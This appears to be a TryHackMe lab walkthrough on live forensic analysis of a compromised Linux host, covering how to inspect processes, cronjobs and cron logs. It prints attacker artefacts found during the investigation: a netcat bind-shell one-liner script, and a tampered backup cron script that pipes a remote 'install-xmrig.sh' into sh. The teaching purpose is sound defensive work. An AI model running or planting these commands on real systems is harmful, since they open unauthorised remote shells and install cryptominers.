## Investigation Setup

**Scenario**

Expanding our investigation from the [Linux File System Analysis](https://tryhackme.com/room/linuxfilesystemanalysis) room, we have been tasked once again by Penguin Corp to perform live analysis on a Linux workstation during a suspected breach. In this scenario, our focus shifts to examining processes, services, scheduled tasks, autostart scripts, and application artefacts on the workstation. We aim to forensically analyse these components to determine any signs of unauthorised modifications, malicious activities, or persistence mechanisms.

By analysing the leftover artefacts and identifying various persistence and backdoor mechanisms, we intend to provide Penguin Corp with a clear understanding of the extent and nature of the compromise.

Connecting to the System

First, click Start Machine to start the VM attached to this task. The machine will start in split-view. In case the VM is not visible, click the Show Split View button at the top of this room. Additionally, we will provide you with SSH credentials, that you may use if you prefer to connect from your own VPN connected machine.

Securing the Environment

While we perform live forensic analysis on this system, it is essential to note that in this assumed scenario, we have already acquired all necessary backups and have isolated the system from the network to prevent further compromise or tampering.

As this is a potentially compromised host, it is a good idea to ensure we are using known good binaries and libraries to conduct our information gathering and analysis. Often, this can be done by mounting a USB or drive containing binaries from a clean Debian-based installation (since the compromised workstation is Ubuntu). This has been simulated on the attached VM by copying the _/bin_, _/sbin_, _/lib_, and _/lib64_ folders from a clean installation into the _/mnt/usb_ mount on the affected system.

This effort aims to mitigate the risk of inadvertently executing malicious code or compromised utilities on systems. Suppose an attacker gains privileged access to a system. In that case, they may replace or alter existing utilities with malicious binaries or libraries that could cause further harm when run by an unsuspecting investigator. By using a trusted source, it enhances the reliability and integrity of our investigation.

We can modify our `PATH` and `LD_LIBRARY_PATH` (shared libraries) environment variables to use these trusted binaries:

Modifying Environment Variables to Include Trusted Paths

**Victim**

```shell-session
export PATH=/mnt/usb/bin:/mnt/usb/sbin
export LD_LIBRARY_PATH=/mnt/usb/lib:/mnt/usb/lib64
check-env
```

## Processes

In Linux, a _process_ is a running instance of a program. When you execute a program or command in Linux, the operating system creates a process for running that program. Each process has its unique identifier called a Process ID (PID), which helps the operating system to manage and track it.

Processes can have parent-child relationships, forming a hierarchical structure. When one process spawns another process (for example, when one shell session spawns an additional process in a subshell), the new process becomes the child of the process that created it, referred to as its parent. This relationship is essential for managing processes and resource allocation within the operating system.

Various tools and utilities can be employed to inspect the running processes on a system. Using this enumeration, we can seek to identify malicious activity or suspicious parent-child process relationships.

### ps

The `ps` command is a versatile utility in UNIX-like operating systems that reports a snapshot of the active processes on the system. By default, it displays information about processes associated with the current (active running) console session, but it can also be used to gather system-wide and other user's process information. The utility retrieves this information by reading files in the `/proc` virtual filesystem, a hierarchical directory structure corresponding to each process on the running system. To run the command, simply type `ps`:

Viewing Processes with ps

```shell-session
investigator@tryhackme:~$ ps
    PID TTY          TIME CMD
   1335 pts/0    00:00:00 bash
   1745 pts/0    00:00:00 ps
```

As seen above, the command provides its output in a table-like format with the following columns:

| PID:  | A unique identifier (Process ID) for each process. |
| ----- | -------------------------------------------------- |
| TTY:  | The terminal associated with the process.          |
| TIME: | The cumulative CPU time consumed by the process.   |
| CMD:  | The command associated with the process.           |

It is also possible to view processes specific to a user (Janice) by using the `-u` or `--user` option followed by the user's username:

Viewing Janice's Processes with ps

```shell-session
investigator@tryhackme:~$ ps -u janice
    PID TTY          TIME CMD
    773 ?        00:00:00 sh
    775 ?        00:00:00 abzkd83o4jakxld
    781 ?        00:00:00 cat
    782 ?        00:00:00 sh
    783 ?        00:00:00 nc
```

A handy set of options to provide with the `ps` command is `-eFH`, which combines several options to return a comprehensive overview of all processes running on the system in a hierarchical format, regardless of the terminal or session to which they are attached. This set of options makes it a valuable tool for system monitoring and forensic analysis:

Viewing All Processes with ps

```shell-session
investigator@tryhackme:~$ ps -eFH
UID          PID    PPID  C    SZ   RSS PSR STIME TTY          TIME CMD

...

janice       775     773  0  2156  2148   0 22:08 ?        00:00:00         /bin/bash /home/janice/abzkd83o4jakxld.sh
janice       781     775  0  1845   396   0 22:08 ?        00:00:00           cat /tmp/f
janice       782     775  0   654   452   0 22:08 ?        00:00:00           /bin/sh -i
janice       783     775  0   815   664   0 22:08 ?        00:00:00           nc -l 0.0.0.0 4444
...
ubuntu      1681       1  0 39155  5728   0 15:39 ?        00:00:00   /usr/libexec/gvfsd-metadata
```

Note: As PIDs are sequentially assigned, you will likely have different PID and PPID values listed.

As seen in the above command, we select all processes with `-e`, return the results in extra full format `-F`, and show the process hierarchy (forest) `-H`.

This command will produce a large output, so it is best to paginate the output by piping it to `less` or using `grep` to filter the output. However, when scrolling through the list, we can identify several suspicious processes (781, 782 and 783) that may hint at malicious activity. We can also identify that these three processes have the parent of PID: 775, which is useful for our notes.

Note again that the PIDs are sequentially generated and will be different on each machine, but in the above example, the following process command line values are worth investigating:

`nc -l 0.0.0.0 4444`

In this command, the Netcat utility listens on all available network interfaces (open to connections from any IP address) on port 4444. Seeing this command in a running process is suspicious as it can suggest an attempt to establish unauthorised access to the system through a bind shell. A bind shell works when a host binds to a specific port, awaits incoming network connections, and spawns a shell, granting the connecting entity command-line access to the host.

`cat /tmp/f` and `/bin/sh -i`

These two commands may suggest how the bind shell spawns its eventual command-line (`/bin/sh`) shell for whoever connects to the Netcat listener. Specifically, the file creation of `/tmp/f` suggests an attacker may have created a named pipe to transmit data bidirectionally between processes, as it is a common indicator of a bind shell one-liner.

We can further confirm that a named pipe was created by listing the file and noting the `p` file type indicator in the permissions section of the output, which denotes a named pipe:

Listing the Named Pipe in the /tmp Folder

```shell-session
investigator@tryhackme:~$ ls -l /tmp/f
prw-rw-r-- 1 janice janice 0 Mar 13 15:54 /tmp/f
```

Putting these processes together, we can identify that the Janice user has executed a bind shell listener to provide a connecting party command-line access to the host.

### lsof

Let's explore a more powerful way to report a list of all open files and their associated processes within the running system. `lsof` (List Open Files) is a utility that lists information about files opened by processes on a system. In this case, to view any files open by the Netcat process we identified earlier, we can run `lsof` and provide the PID (783):

Listing Open Files with lsof

```shell-session
investigator@tryhackme:~$ sudo lsof -p 783
...
COMMAND PID   USER   FD   TYPE DEVICE SIZE/OFF    NODE NAME
nc      783 janice  cwd    DIR  202,1     4096 1024049 /home/janice
nc      783 janice  rtd    DIR  202,1     4096       2 /
...
nc      783 janice    0r  FIFO   0,13      0t0   28393 pipe
nc      783 janice    1w  FIFO  202,1      0t0    3437 /tmp/f
nc      783 janice    2u   REG  202,1        0    2621 /tmp/#2621 (deleted)
nc      783 janice    3u  IPv4  28400      0t0     TCP *:4444 (LISTEN)
```

Note: Replace 783 with the PID you identified earlier, executing `nc -l 0.0.0.0 4444`.

The above output tells us a couple of important things. It confirms the existence of named pipes (FIFO) associated with the `/tmp/f` file, which are being written to and read from. Additionally, it indicates that the process is listening on TCP port 4444, indicating that it might be functioning as a server or a listener. This information aligns with our findings of a bind shell setup where data transmission is facilitated bidirectionally between processes using named pipes.

Next, we should further analyse the process of parent-child relationships using `pstree`. Doing so will tell us where the process originated and provide insights into potential attack vectors.

### pstree

`pstree` is a command-line utility that displays processes visually as a tree, showing the parent-child relationships between processes. This utility can help identify the origin of the suspicious processes and understand their relationship to other processes in the system.

We can perform a deeper process analysis of the parent process we identified above (PID: 775) using `pstree` and provide options to list its parent processes (`-s`) and their corresponding PIDs (`-p`):

Illustrating the Process Hierarchy with pstree

```shell-session
investigator@tryhackme:~$ pstree -p -s 775
systemd(1)───cron(706)───cron(769)───sh(773)───abzkd83o4jakxld(775)─┬─cat(781)
                                                                       ├─nc(783)
                                                                       └─sh(782)
```

Note: Replace 775 with the PID of the parent process you identified earlier.

In the above output, we can see a hierarchical view of the process tree, where each process is listed along with its parent process and PID. From this tree, we can see that the Netcat (nc) process was spawned by intermediary processes (abzkd83o4jakxld and sh), which are executing scripts spawned by a cronjob (cron).

Now that we have a better idea of how the Netcat process was spawned, we can focus on the parent shell and cron processes to see the commands that were run. To do this, we can return to the `ps` command in full-format listing (`-f`) and filter by those specific PIDs we found in the `pstree` output:

Listing Processes with ps

```shell-session
investigator@tryhackme:~$ ps -f 769 773 775 783
UID          PID    PPID  C STIME TTY      STAT   TIME CMD
root         769     706  0 22:08 ?        S      0:00 /usr/sbin/CRON -f
janice       773     769  0 22:08 ?        Ss     0:00 /bin/sh -c /home/janice/abzkd83o4jakxld.sh
janice       775     773  0 22:08 ?        S      0:00 /bin/bash /home/janice/abzkd83o4jakxld.sh
janice       783     775  0 22:08 ?        S      0:00 nc -l 0.0.0.0 4444
```

Note: Replace 769, 773, 775, and 783 with the PIDs you identified with `pstree`.

This output concludes that a suspicious shell script (`abzkd83o4jakxld.sh`) has been executed from the `/home/janice` directory. If we view the contents of this file, we can confirm that it matches the indicators of a common bind shell one-liner, as discussed earlier:

Viewing the Contents of the Suspicious .sh Script

```shell-session
investigator@tryhackme:~$ cat /home/janice/abzkd83o4jakxld.sh 
#!/bin/bash

# Set the path to the lock file
LOCKFILE="/tmp/abzkd83o4jakxld.lock"

# Check if lock file exists
if [ -e "$LOCKFILE" ]; then
    echo "Script is already running. Exiting."
    exit 1
fi

# Create lock file
touch "$LOCKFILE"

# Main command
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc -l 0.0.0.0 4444 > /tmp/f

# Remove lock file
rm -f "$LOCKFILE"
```

In summary, this main command sequence (under # Main command) creates a named pipe, reads from it, and passes the data to a shell (`/bin/sh`) in interactive mode (`-i`). The remaining bits of the file seem complicated, but establishing a lock file is just one way to ensure that only one instance of the bind shell runs at a time. The attacker of this scenario likely set up this command sequence to establish persistence and enable future remote connections for malicious activities.

### top

So far, we've explored static snapshots of running processes using commands like `ps` and `pstree`. While these tools provide valuable insights into the system's current state, they lack real-time monitoring capabilities. `top` provides a continuously updated display of system processes sorted by various criteria, such as CPU or memory usage. It dynamically refreshes its output, allowing you to observe real-time changes. It also offers a powerful interactive interface to sort and filter processes on the fly.

We can filter the output to only show processes related to the "Janice" user (`-u janice`), update dynamically every 5 seconds (`-d 5`), and display the full command paths (`-c`):

Listing Real-Time Processes with top

```shell-session
investigator@tryhackme:~$ top -d 5 -c -u janice
...
    PID USER      PR  NI    VIRT    RES    SHR S  %CPU  %MEM     TIME+ COMMAND

Identifying Suspicious Parent-Child Process Relationships

Identifying suspicious parent-child process relationships is essential to the IR process and can quickly confirm or rule out malicious activity. The best way to recognize what is abnormal is to establish a baseline for normal behavior specific to your systems, environment, and organization. This baseline should include typical processes, relationships, and resource usage under normal operating conditions.

For example, if an Apache web server process owned by the standard _www-data_ user spawns a bash child process, it could indicate malicious activity such as a command injection or remote code execution. In a typical web server environment, the Apache process handles incoming HTTP requests and serves web pages or executes server-side scripts, usually within a restricted environment. However, if a bash shell is spawned as a child process of the Apache server process, it suggests that the server may have been compromised or that malicious code is being executed.

In most cases, monitoring tools and SIEM solutions can be tuned proactively to baseline the typical behavior of the system and alert on process and process relationship occurrences that stray from this baseline.

## Cronjobs

Cronjobs are scheduled tasks executed automatically at predefined intervals by the cron daemon. The cron daemon is a background process responsible for managing cronjobs based on configuration files known as crontabs. Users can have their crontab file stored in the `/var/spool/cron/crontabs` directory. The main crontab file at `/etc/crontab` governs system-wide cronjobs.

Below is a brief refresher on cronjobs and their syntax. For a more detailed look into Linux cronjobs, go through the [Linux Fundamentals Part 3](https://tryhackme.com/room/linuxfundamentalspart3) room.

Cron entries follow a specific format consisting of space-separated fields. Let's first look at an example crontab file for a user named Bob. Typically, this file would be located in `/var/spool/cron/crontabs/bob`:

Example Cron Entry

```shell-session
10 05 * * * /home/bob/backup_tmp.sh
```

This cron schedule consists of five fields followed by the command to execute:

* Minute (10): The first field specifies the minute when the command will be executed. In this case, it's 10, indicating that the command will be executed at the 10th minute of the hour.
* Hour (05): The second field specifies the hour when the command will be executed. It's 05, indicating that the command will be executed at 5:10 AM.
* Day of the Month (\*): The third field specifies the day of the month when the command will be executed. In this case, it's \*, a wildcard value, meaning it will be executed every day of the month. You can also specify a specific day of the month using numbers from 1 to 31. For example, to execute the command on the 15th day of every month, you would use 15.
* Month (\*): The fourth field specifies the month when the command will be executed. Here, it's also \*, meaning the command will be executed monthly. You can specify months using either numbers (1 for January, 2 for February, etc.) or shorthand names (Jan for January, Feb for February, etc.). For example, you can use either 2 or Feb to execute the command only in February.
* Day of the Week (\*): The fifth field specifies the day of the week the command will be executed. In this case, it's \*, which means the command will be executed every day of the week. You can also specify days of the week using numbers from 0 to 7, where 0 and 7 represent Sunday, 1 represents Monday, and so on. Alternatively, you can use the shorthand names (Sun, Mon, Tue, etc.). For example, you can use either 1 or Mon.
* Command (`/home/bob/backup_tmp.sh`): The final field contains the command to be executed.

Additionally, it's important to note that the system-level `/etc/crontab` differs from user-level crontabs. System-wide crontabs will include an additional field specifying the user under which the command will run (i.e., _root_ or _www-data_).

Putting it all together, the cron schedule is configured to execute the command `/home/bob/backup_tmp.sh` at 5:10 AM every day.

For thorough documentation on reading and creating Cron expressions, check out [Crontab Guru](https://crontab.guru/).

Cronjobs, while essential for automating tasks, can also be a target for attackers seeking to establish persistence or escalate privileges on a system. Therefore, it's crucial for incident responders and forensic analysts to know how to analyse the system for any suspicious cronjobs or scheduled tasks.

### Cron Configuration Files

We can begin our investigation into cronjobs on the system by first taking inventory of the system's cron configuration files. Fortunately, this process is relatively straightforward as these files are typically stored in known locations.

/etc/crontab

Firstly, let's focus on `/etc/crontab`, the main repository for system-wide cronjobs. Administrators can configure tasks that require elevated privileges within this file, often executing commands as the root user. To view this file, we can `cat` its contents:

### Viewing /etc/crontab

```shell-session
investigator@tryhackme:~$ cat /etc/crontab
...
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
...
*/5 * * * * root /var/tmp/backup
```

The above contents of `/etc/crontab` show the default shell and path variables used to execute commands. Below that, we can see a single cronjob entry:

`*/5 * * * * root /var/tmp/backup`

By reading the syntax above, we can determine that the `/var/tmp/backup` file will execute every five minutes as root. The `*/5` is a way within cron's syntax to specify every fifth minute.

This finding invokes immediate suspicion as a system-level cronjob executes a command with root privileges in the `/var/tmp` directory. This is a world-writable directory, meaning that any user can modify or replace the `backup` file that is being executed. This could be a misconfiguration that an attacker abused to escalate privileges or a persistence method created by the attacker after gaining root access to the system.

When viewing the contents of this `backup` file, we can determine suspicious additions to the script:

Viewing the Contents of /var/tmp/backup

```shell-session
investigator@tryhackme:~$ cat /var/tmp/backup
#!/bin/bash

tar -czf web_backup.tar.gz /var/www/html && curl -sSL http://h4x0rcr7pt.thm/install-xmrig.sh | sh
```

Although the backup script initially appears to perform a legitimate backup operation, an additional command has been appended to download and execute an install script via `curl`. From the name of the script, it appears to be related to the XMRig cryptocurrency mining software and warrants further investigation. This example illustrates a common tactic attackers use to leverage compromised systems for unauthorised cryptocurrency mining.

Next, additional system cronjob directories are important for a thorough analysis. These directories are found under the `/etc/` directory with the following naming convention:

* /etc/cron.hourly/ - System cronjobs that run once per hour.
* /etc/cron.daily/ - System cronjobs that run once per day.
* /etc/cron.weekly/ - System cronjobs that run once per week.
* /etc/cron.monthly/ - System cronjobs that run once per month.
* /etc/cron.d/ - Additional custom system cronjobs.

With these locations in mind, we can list out any configured cronjobs with the `ls` command:

In the output above, most of these cronjobs look benign - however, it's always important to investigate their contents to be sure. Similar to processes, this is why it's always essential to have a pre-established baseline in order to spot anomalies quickly.

/var/spool/cron/crontabs/

After investigating the system-level cronjobs, we can look at the various user-level cronjobs configured by users on the system. User-level cronjobs are specific to individual user configuration files and are managed independently of system-wide cronjobs. We can navigate to the `/var/spool/cron/crontabs/` directory. Each user with permission to use cron will have their file inside this directory, named after their username.

There are several ways to enumerate this information. The easiest way is to list the contents of the directory with sudo-privileges:

### Listing User-Level Cronjobs

```shell-session
investigator@tryhackme:~$ sudo ls -al /var/spool/cron/crontabs/
total 28
drwx-wx--T 2 root   crontab 4096 Mar 13 00:05 .
drwxr-xr-x 5 root   root    4096 Oct 26  2020 ..
-rw------- 1 bob    crontab 1157 Mar 13 00:05 bob
-rw------- 1 elijah crontab 1122 Mar 13 00:02 elijah
-rw------- 1 janice crontab 1132 Mar 12 23:38 janice
-rw------- 1 root   crontab 1122 Mar 12 23:45 root
-rw------- 1 ubuntu crontab 1225 Feb 27  2022 ubuntu
```

As seen in the above output, user-level cronjobs have been configured by several users on the system.

We can view the contents of these files separately (using `cat`) to analyse their contents, or we could use the `crontab` command. This command can manage, create, or view user-level cronjobs. The `-u` argument can be used to specify a specific user's cron configuration, and the `-l` argument can be used to display the contents of the cronjob. To view Janice's cronjobs, we can run:

Viewing Janice's Configured Cronjobs

```shell-session
investigator@tryhackme:~$ sudo crontab -l -u janice
...
# m h  dom mon dow   command
* * * * * /home/janice/abzkd83o4jakxld.sh
```

As seen in the above output, we have discovered the specific cronjob that executes the `abzkd83o4jakxld.sh` bind shell, which we identified in the previous task.

Using a clever one-liner command, we can quickly loop through the users on the system and identify if they have any user-level cronjobs configured. If so, we can output the contents of the cronjob entry to the terminal. This type of hybrid automation can help speed up investigations and ensure thorough coverage:

### Using a One-Liner to List User Cron Entries

```shell-session
investigator@tryhackme:~$ sudo bash -c 'for user in $(cut -f1 -d: /etc/passwd); do entries=$(crontab -u $user -l 2>/dev/null | grep -v "^#"); if [ -n "$entries" ]; then echo "$user: Crontab entry found!"; echo "$entries"; echo; fi; done'
...
janice: Crontab entry found!
* * * * * /home/janice/abzkd83o4jakxld.sh

bob: Crontab entry found!
10 05 * * * /home/bob/backup_tmp.sh
30 04 * * * /var/tmp/findme.sh
...
```

To break down this command, we are iterating over all of the users on the system by filtering out the entries in `/etc/passwd`. From each of these returned users, it iterates each user and fetches their crontab entries using the `crontab` command we ran earlier. If a crontab entry exists for that user, we will return their username and the entry from the crontab file.

As seen in the above output, we have quickly determined the values of multiple users' crontab entries.

### Cron Execution Logs

Cron logs record the execution of scheduled tasks managed by the cron daemon and provide a chronological record of when cron jobs were executed, along with any associated output or error messages. From a forensic standpoint, these logs can be invaluable in uncovering execution artefacts of cronjobs and lead to discovering suspicious activities or system compromises. For example, suppose a malicious actor abused an existing cronjob or created a malicious cronjob and attempted to cover their tracks. In that case, the logs might reveal unusual patterns of execution or unexpected commands being run.

On Debian-based systems, cron execution logs are typically stored in `/var/log/syslog`. This file aggregates system logs, including messages from the cron daemon. In some Linux distributions, such as Red Hat Enterprise Linux (RHEL) and CentOS, these logs may be found in the aptly named `/var/log/cron`.

Because the system we're investigating stores cron logs in the syslog file, we can `grep` the contents and filter for any logs related to cron:

### Filtering Syslog for Cron Logs

```shell-session
investigator@tryhackme:~$ sudo grep cron /var/log/syslog
```

The above command will produce a large amount of output. It is a good idea to filter the results further based on specific criteria to focus on relevant information. Some example ideas to filter on include:

### Filtering Syslog for Failed Cron Logs

```shell-session
investigator@tryhackme:~$ sudo grep cron /var/log/syslog | grep -E 'failed|error|fatal'
```

The above command will filter out cron entries associated with failed job executions. In this case, there are no results - but this can be a useful method to catch anomalies.

We can also filter for specific users:

### Filtering Syslog for Bob's Cron Logs

```shell-session
investigator@tryhackme:~$ sudo grep cron /var/log/syslog | grep -i 'bob'
Mar 13 00:04:35 tryhackme crontab[3016]: (root) LIST (bob)
Mar 13 00:05:17 tryhackme crontab[3053]: (bob) BEGIN EDIT (bob)
Mar 13 00:05:45 tryhackme crontab[3053]: (bob) END EDIT (bob)
Mar 13 00:05:47 tryhackme crontab[3058]: (bob) BEGIN EDIT (bob)
Mar 13 00:05:59 tryhackme crontab[3058]: (bob) REPLACE (bob)
Mar 13 00:05:59 tryhackme crontab[3058]: (bob) END EDIT (bob)
Mar 13 00:06:01 tryhackme cron[704]: (bob) RELOAD (crontabs/bob)
Mar 13 00:06:32 tryhackme crontab[3259]: (root) LIST (bob)
```

The above command will filter cron entries specifically associated with Bob. Note that in the above output, we can even see the timestamps of when Bob's crontab file was modified.

### Pspy

[Pspy](https://github.com/DominicBreuker/pspy) is a powerful open-source tool used to monitor Linux processes without the need for root privileges. It is designed to capture and display real-time information about running processes, including their execution commands, user IDs, process IDs (PIDs), parent process IDs (PPIDs), timestamps, and other relevant details. It operates by reading data directly from the `/proc` virtual filesystem, providing real-time insights into process activity without modifying system files or requiring elevated permissions.

While it's excellent for enumeration purposes, incident responders can benefit from its ability to collect execution artefacts and catch short-lived processes. Due to its real-time monitoring, it can also detect processes generated by various cronjobs through the system, giving us more insight into which processes occur when cronjobs are run.

In this system, Pspy has been pre-installed along with the mounted binaries we have been using. As such, it is in our path and can be called simply by running `pspy64`. It will begin to monitor in real time, and we should let it run for a few minutes to capture events. It can be stopped by pressing `Ctrl + C`:

Using pspy64 to Monitor Executions

```shell-session
investigator@tryhackme$ pspy64

2024/03/13 19:39:01 CMD: UID=1003  PID=3401   | /bin/bash /home/janice/abzkd83o4jakxld.sh
```

Note: The output may appear stalled or paused for a few moments as it initialises.

This command will produce a large amount of continuous output as normal system operations occur. However, we can quickly note that the cronjobs on the system that we identified previously (such as `/bin/bash /home/janice/abzkd83o4jakxld.sh`) are detected.
